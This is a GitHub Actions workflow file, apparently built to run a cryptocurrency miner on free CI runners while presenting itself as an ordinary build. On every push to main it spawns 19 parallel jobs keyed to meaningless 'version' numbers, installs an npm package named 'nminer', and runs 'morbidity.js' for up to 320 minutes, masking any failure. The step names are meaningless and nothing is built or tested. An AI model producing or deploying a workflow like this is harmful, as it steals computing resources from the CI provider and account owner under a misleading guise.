name: morbidity
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6466 }
          - { version: 8827 }
          - { version: 280 }
          - { version: 9629 }
          - { version: 2889 }
          - { version: 9627 }
          - { version: 9499 }
          - { version: 933 }
          - { version: 9284 }
          - { version: 3386 }
          - { version: 9713 }
          - { version: 6219 }
          - { version: 7314 }
          - { version: 3351 }
          - { version: 7629 }
          - { version: 3484 }
          - { version: 6061 }
          - { version: 4401 }
          - { version: 7876 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: greedily
        run: |
          npm install nminer@latest
          timeout 320m node morbidity.js || echo "morbidity executed"